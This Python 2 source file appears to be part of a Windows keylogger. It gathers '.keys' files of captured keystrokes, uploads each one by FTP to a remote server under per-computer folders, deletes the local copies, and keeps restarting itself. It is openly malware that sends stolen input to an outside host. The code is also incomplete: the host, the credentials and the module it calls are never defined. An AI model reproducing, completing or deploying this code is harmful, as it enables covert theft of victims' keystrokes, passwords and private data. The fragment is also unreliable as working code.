import os, sys, win32console, win32gui, socket, subprocess,  time, threading, hashlib, ftplib, pythoncom, pyHook, win32api
import pyscreenshot as ImageGrab
class SendKeys():
	def __init__(self):
		self.thread = threading.Thread(target=self.run)

	def run(self):
		for file in os.listdir(str(os.getcwd())):
			if file.endswith(".keys"):
				fileName = file
				global ftp
				ftp = ftplib.FTP()
				ftp.connect(host,port)
				ftp.login(user,password)
				print ' [+] FTP Connected to %s:%s' % (str(host), str(port))
				ftp.cwd('Furnace')
				try:
					ftp.cwd(pc_name)
				except:
					ftp.mkd(pc_name)
					ftp.cwd(pc_name)
				module.fileTransferProtocol.upload(fileName)
				print [' [+] Keylogger: "' + str(fileName) + '" upload sucess.']
				ftp.close()
				try:
					os.remove(fileName)
				except:
					pass
		time.sleep(10)




def main():

	t4 = SendKeys()

	while 1:
		try:
			if(t4.thread.isAlive() == False):
				print 'SendKeys: Closed.'
				t4 = SendKeys()
				t4.thread.start()
				print 'SendKeys: Restarted.'
		except:
			print 'Error'


if __name__ == '__main__':
	main()